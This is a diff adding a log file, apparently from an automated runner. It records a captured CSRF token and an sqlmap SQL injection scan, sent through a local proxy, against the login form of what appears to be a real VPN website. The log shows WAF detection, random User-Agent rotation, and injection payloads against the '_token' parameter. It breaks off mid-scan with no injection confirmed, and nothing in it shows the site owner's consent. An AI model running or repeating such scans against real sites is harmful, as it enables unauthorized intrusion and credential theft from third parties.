@@ -1,0 +1,60 @@
+Proxy PID: 75582
+Proxy running on port 8080
+CSRF: plCFrE8OyRAh2999n5MJrgGkwl2G4v...
+Request file: /tmp/sqlmap_req.txt
+
+=== Running sqlmap through proxy ===
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.10#pip}
+|_ -| . [)]     | .'| . |
+|___|_  ["]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:24:32 /2026-10-24/
+
+[08:24:32] [INFO] parsing HTTP request from '/tmp/sqlmap_req.txt'
+[08:24:32] [DEBUG] cleaning up configuration parameters
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:24:32] [DEBUG] setting the HTTP timeout
+[08:24:32] [DEBUG] setting the HTTP User-Agent header
+[08:24:32] [DEBUG] setting the HTTP/SOCKS proxy for all HTTP requests
+[08:24:32] [DEBUG] creating HTTP requests opener object
+it appears that provided value for POST parameter 'email' has boundaries. Do you want to inject inside? ('@EMAIL*@') [y/N] N
+[08:24:32] [DEBUG] used the default behavior, running in batch mode
+POST parameter '_token' appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y/N] N
+[08:24:32] [DEBUG] used the default behavior, running in batch mode
+[08:24:32] [INFO] testing connection to the target URL
+[08:24:33] [DEBUG] declared web page charset 'utf-8'
+[08:24:33] [DEBUG] got HTTP error code: 403 ('Forbidden')
+[08:24:33] [WARNING] potential permission problems detected ('Access denied')
+[08:24:33] [WARNING] the web server responded with an HTTP error code (403) which could interfere with the results of the tests
+[08:24:33] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
+[08:24:33] [DEBUG] loading random HTTP User-Agent header(s) from file '/home/runner/.local/lib/python3.12/site-packages/sqlmap/data/txt/user-agents.txt'
+[08:24:33] [INFO] testing if the target URL content is stable
+got a 301 redirect to 'https://www.nadiavpn.web.id/login'. Do you want to follow? [Y/n] Y
+[08:24:33] [DEBUG] used the default behavior, running in batch mode
+redirect is a result of a POST request. Do you want to resend original POST data to a new location? [y/N] N
+[08:24:33] [DEBUG] used the default behavior, running in batch mode
+[08:24:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:33] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:33] [WARNING] POST parameter '_token' does not appear to be dynamic
+[08:24:33] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' ).,()"),)'-- -
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:34] [WARNING] heuristic (basic) test shows that POST parameter '_token' might not be SQL injectable
+[08:24:34] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo' 'YlAPIi<'">)tqavhe-- -
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:34] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
+[08:24:34] [INFO] testing for SQL injection on POST parameter '_token'
+[08:24:34] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[08:24:34] [PAYLOAD] plCFrE8OyRAh2999n5MJrgGkwl2G4vsKahQg5eKo'  AND 5909=9503-- -
+[08:24:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLS_CLIENT' ('OSError: Tunnel connection failed: 501 Unsupported method ('CONNECT')')
+[08:24:35] [DEBUG] SSL connection error occurred for 'PROTOCOL_TLSv1_2' ('SSLError: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)')
